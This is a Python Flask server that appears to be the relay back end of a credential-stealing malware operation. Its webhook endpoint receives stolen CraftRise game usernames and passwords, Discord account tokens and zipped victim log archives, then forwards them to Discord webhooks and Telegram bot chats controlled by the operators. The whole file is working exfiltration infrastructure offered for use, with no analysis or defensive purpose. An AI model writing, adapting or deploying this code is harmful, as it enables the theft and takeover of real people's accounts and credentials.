from flask import Flask, request, jsonify
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")

CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")

MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")

last_zip_path = None

def send_discord_embed(url, embed_data):
    if not url:
        return
    try:
        requests.post(url, json=embed_data, timeout=30)
    except Exception as e:
        print(f"Discord embed hatası: {e}")

def send_discord_with_file(url, content, file_path):
    if not url or not file_path or not os.path.exists(file_path):
        return
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            data = {'content': content}
            requests.post(url, data=data, files=files, timeout=60)
        print(f"[+] ZIP dosyası Discord'a gönderildi: {file_path}")
    except Exception as e:
        print(f"Discord dosya gönderme hatası: {e}")
        send_discord_embed(url, {"content": content})

def send_telegram_token(token, chat_id, msg):
    """Telegram'a temiz mesaj gönder - emojisiz, sade"""
    if token and chat_id and msg:
        try:
            if len(msg) > 4000:
                msg = msg[:4000] + "..."
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         json={"chat_id": chat_id, "text": msg}, timeout=30)
        except Exception as e:
            print(f"Telegram hatası: {e}")

@app.route('/webhook', methods=['POST'])
def webhook():
    global last_zip_path
    
    try:
        data = request.get_json()
        log_type = data.get("type", "unknown")
        
        print(f"[{datetime.now()}] Type: {log_type}")
        
        if log_type == "craftrise":
            send_discord_embed(CRAFTRISE_WEBHOOK, data)
            
            creds = data.get("creds", {})
            user = creds.get("username", "Unknown")
            pw = creds.get("password", "Unknown")
            tg_msg = f"{user}:{pw}"
            send_telegram_token(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, tg_msg)
            send_telegram_token(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, f"CraftRise: {tg_msg}")
        
        elif log_type == "discord":
            send_discord_embed(DISCORD_WEBHOOK, data)
            
            token_val = data.get("token_val", "Unknown")
            send_telegram_token(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, token_val)
            send_telegram_token(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, f"Discord Token: {token_val}")
        
        else:
            zip_path = data.get("zip_path", last_zip_path)
            content_text = data.get("content", "")
            
            if zip_path and os.path.exists(zip_path):
                send_discord_with_file(MASTER_WEBHOOK, content_text, zip_path)
                send_discord_with_file(WEBHOOK, content_text, zip_path)
            else:
                send_discord_embed(MASTER_WEBHOOK, data)
                send_discord_embed(WEBHOOK, data)
            
            tg_msg = f"New Log: {content_text}\n"
            embeds = data.get("embeds", [])
            for embed in embeds:
                title = embed.get("title", "")
                if title: tg_msg += f"{title}\n"
                fields = embed.get("fields", [])
                for field in fields:
                    tg_msg += f"{field.get('name')}: {field.get('value')}\n"
            
            send_telegram_token(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg.strip())
            send_telegram_token(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, tg_msg.strip())
            
            if zip_path:
                last_zip_path = zip_path
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "HollyShit Proxy Running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
